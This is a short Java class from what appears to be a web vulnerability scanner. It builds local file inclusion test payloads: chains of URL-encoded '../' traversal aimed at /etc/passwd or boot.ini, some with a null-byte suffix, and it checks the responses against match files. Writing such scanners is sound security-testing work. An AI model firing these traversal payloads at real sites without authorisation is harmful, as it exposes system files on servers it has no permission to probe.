package org.webheal.scanner.attack;

import java.io.File;

// most attacks have set of params you hit site with and text in response body
public class LFIAttackAndResponseMatch extends AttackAndResponseMatch {
    public LFIAttackAndResponseMatch(File dir, boolean windows) throws Exception {
        super(dir,null, windows ? "lfiasp_match.txt" : "lfiphp_match.txt");
        if ( windows ) {
            attacks.add(getBootIni(20) + "boot.ini" + "%00.htm");
            attacks.add(getBootIni(20) + "boot.ini");
        } else {
            attacks.add(getBootIni(10) + "etc/passwd" + "%00.htm");
            attacks.add(getBootIni(10) + "etc/passwd");
        }
    }

    private String getBootIni(int count)
    {
        StringBuilder buf = new StringBuilder();
        for (int i = 0; i < count ; i++)
        {
            buf.append("..%2f");
        }
        return buf.toString();
    }
}
